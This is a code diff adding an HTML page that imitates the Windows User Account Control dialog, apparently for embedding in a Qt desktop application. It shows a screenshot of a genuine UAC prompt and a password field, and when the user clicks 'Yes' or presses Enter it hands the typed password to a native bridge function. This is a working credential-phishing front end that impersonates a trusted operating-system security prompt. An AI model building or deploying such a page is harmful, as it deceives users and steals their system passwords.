@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows UAC Prompt</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            /*
+            background: #f3f3f3;
+            background: transparent;
+            */
+
+            background-image: url("background.png");
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #000000;
+            padding: 20px;
+        }
+        
+        .bodyimage {
+            width: 100%
+        }
+
+        .window {
+            width: 460px;
+            background: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+            border: 1px solid #e5e5e5;
+        }
+
+        .titlebar {
+            /*background: #ffffff;*/
+            background:rgba(232, 232, 232) ;
+            padding: 8px 0px 8px 16px;
+            border-bottom: 1px solid #e5e5e5;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 32px;
+            border-top-right-radius: 8px;
+            border-top-left-radius: 8px;
+        }
+
+        .title {
+            font-size: 12px;
+            font-weight: 400;
+            color: #000000;
+        }
+
+        .window-controls {
+            display: flex;
+            gap: 2px;
+        }
+
+        .control-btn {
+            width: 46px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-size: 16px;
+            color: #666;
+            margin-left: -8px;
+        }
+
+        .control-btn:hover {
+            background: #f0f0f0;
+        }
+
+        .close:hover {
+            background: #e81123;
+            color: white;
+        }
+
+        .content {
+            padding: 0;
+        }
+
+        .uac-header {
+            padding: 24px 24px 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 16px;
+        }
+
+        .uac-icon {
+            width: 40px;
+            height: 40px;
+            background: #0078d4;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .uac-text {
+            flex: 1;
+        }
+
+        .uac-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #000000;
+            margin-bottom: 8px;
+        }
+
+        .uac-question {
+            font-size: 15px;
+            line-height: 1.4;
+            color: #323130;
+        }
+
+        .uac-app-info {
+            background: #f8f8f8;
+            border: 1px solid #e1e1e1;
+            padding: 16px;
+            margin: 0 24px 20px;
+        }
+
+        .app-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .app-icon {
+            width: 32px;
+            height: 32px;
+            background: #0078d4;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .app-name {
+            font-weight: 600;
+            font-size: 14px;
+            color: #000000;
+        }
+
+        .uac-publisher {
+            font-size: 13px;
+            color: #323130;
+            margin-bottom: 8px;
+        }
+
+        .uac-show-details {
+            color: #0078d4;
+            font-size: 13px;
+            text-decoration: none;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+        }
+
+        .uac-show-details:hover {
+            text-decoration: underline;
+        }
+
+        .uac-credentials {
+            padding: 0 24px;
+            margin-bottom: 20px;
+        }
+
+        .uac-credential-title {
+            font-size: 14px;
+            margin-bottom: 16px;
+            color: #000000;
+        }
+
+        .uac-input-group {
+            margin-bottom: 16px;
+        }
+
+        .uac-input-label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 6px;
+            color: #323130;
+        }
+
+        .uac-input {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #8a8886;
+            border-radius: 8px;
+            font-size: 14px;
+            background: #ffffff;
+            transition: border-color 0.2s;
+        }
+
+        .uac-input:focus {
+            outline: none;
+            border-color: #0078d4;
+        }
+
+        .uac-more-choices {
+            color: #0078d4;
+            font-size: 13px;
+            text-decoration: none;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+        }
+
+        .uac-more-choices:hover {
+            text-decoration: underline;
+        }
+
+        .uac-buttons {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            padding: 16px 24px;
+            /*background: #f8f8f8;*/
+            background: #F3F3F3;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .uac-button {
+            padding: 8px 24px;
+            border: 1px solid #8a8886;
+            border-radius: 4px;
+            background: #f3f2f1;
+            cursor: pointer;
+            font-size: 14px;
+            min-width: 80px;
+            transition: all 0.1s ease;
+            width: 50%;
+            height: 40px;
+        }
+
+        .uac-button:hover {
+            background: #e1e1e1;
+        }
+
+        .uac-button.yes {
+            background: #0078d4;
+            color: white;
+            border-color: #0078d4;
+            margin-left: 10px;
+        }
+
+        .uac-button.yes:hover {
+            background: #106ebe;
+            border-color: #106ebe;
+        }
+
+        .uac-button:active {
+            transform: translateY(1px);
+        }
+
+        .uac-warning {
+            font-size: 12px;
+            color: #d13438;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .chevron {
+            margin-left: 4px;
+            font-size: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="window">
+        <div class="titlebar">
+            <div class="title">User Account Control</div>
+            <div class="window-controls">
+                <button class="control-btn close" onclick="handleClose()">✕</button>
+            </div>
+        </div>
+        
+        <div class="content">
+
+            <!--
+            <div class="uac-header">
+                <div class="uac-icon">🛡️</div>
+                <div class="uac-text">
+                    <div class="uac-title">User Account Control</div>
+                    <div class="uac-question">
+                        Do you want to allow this app to make changes to your device?
+                    </div>
+                </div>
+            </div>
+            
+            <div class="uac-app-info">
+                <div class="app-header">
+                    <div class="app-icon">⚙️</div>
+                    <div class="app-name">Windows Command Processor</div>
+                </div>
+                <div class="uac-publisher">Verified publisher: Microsoft Windows</div>
+                <a class="uac-show-details">Show more details <span class="chevron">▼</span></a>
+            </div>
+            -->
+
+            <img class="bodyimage" src="assets/uac_off_croppped_h4_fixed.png">
+
+            <div class="uac-credentials">
+                <!--
+                <div class="uac-credential-title">
+                    To continue, enter an admin username and password.
+                </div>
+                -->
+                <!--
+                <div class="uac-input-group">
+                    <label class="uac-input-label">Email address</label>
+                    <input type="text" class="uac-input" placeholder="Enter admin email">
+                </div>
+                -->
+                
+                <div class="uac-input-group">
+                    <label class="uac-input-label">Password</label>
+                    <input type="password" class="uac-input" id="uac-input" placeholder="Password">
+                </div>
+                
+                <a class="uac-more-choices">More choices <!--<span class="chevron">▼</span>--></a>
+            </div>
+
+            <div class="uac-warning" id="warningMessage">
+                The app needs admin permission to continue. Please provide admin credentials.
+            </div>
+            
+            <div class="uac-buttons">
+                <button class="uac-button" onclick="handleYes()">Yes</button>
+                <button class="uac-button yes" onclick="handleNo()">No</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="qrc:///qtwebchannel/qwebchannel.js"></script>
+    <script>
+        let bridge;
+
+        window.passwordentry = document.querySelector('.uac-input');
+        const uacinput = document.getElementById("uac-input")
+
+        new QWebChannel(qt.webChannelTransport, function(channel) {
+            bridge = channel.objects.bridge;
+        });
+
+        function handleYes() {
+            const password = window.passwordentry.value;
+            if (bridge) {
+                bridge.on_yes(password); // Pass password directly
+            }
+        }
+
+        function handleNo() {
+            if (bridge) bridge.on_no();
+        }
+
+        uacinput.addEventListener("keydown", function(event) {
+        if (event.key === "Enter") {
+            event.preventDefault(); // optional — prevents form submission
+            handleYes()
+        }
+        });
+        /*
+        function handleYes() {
+            const email = document.querySelector('input[type="text"]').value;
+            const password = document.querySelector('input[type="password"]').value;
+            
+            if (!email || !password) {
+                document.getElementById('warningMessage').style.display = 'block';
+                return;
+            }
+            
+            alert('UAC: Admin credentials accepted');
+            document.querySelector('.window').style.display = 'none';
+        }
+        
+        function handleNo() {
+            document.querySelector('.window').style.display = 'none';
+        }
+        */
+
+        function handleClose() {
+            handleNo();
+        }
+
+        /*
+        document.querySelector('.uac-show-details').addEventListener('click', function() {
+            alert('Additional details:\n• File: cmd.exe\n• Digital signature: Valid\n• Origin: Windows system file\n• File version: 10.0.19041.1\n• Copyright: Microsoft Corporation');
+        });
+
+        document.querySelector('.uac-more-choices').addEventListener('click', function() {
+            alert('More choices would show additional sign-in options such as:\n• Use a different Microsoft account\n• Use Windows Hello\n• Use a security key');
+        });
+        */
+    </script>
+</body>
+</html>
